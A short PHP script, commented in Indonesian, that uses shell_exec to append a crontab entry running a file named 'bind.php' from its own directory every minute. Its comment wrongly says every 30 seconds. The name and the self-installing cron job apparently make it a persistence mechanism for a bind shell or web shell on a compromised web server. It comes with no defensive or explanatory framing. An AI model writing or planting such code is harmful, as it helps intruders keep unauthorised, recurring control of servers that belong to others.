<?php
// Direktori tempat skrip PHP ini diakses
$currentDirectory = dirname(__FILE__);

// Tugas Cron untuk menjalankan perintah setiap 30 detik
$customCronCommand = '* * * * * /usr/local/bin/php ' . escapeshellarg($currentDirectory . '/bind.php');

// Tambahkan tugas Cron yang baru
$result = shell_exec('(crontab -l ; echo "'.$customCronCommand.'") | crontab -');

if ($result === false) {
    echo 'Gagal menambahkan tugas Cron.';
} else {
    echo 'Tugas Cron berhasil ditambahkan.';
}
?>
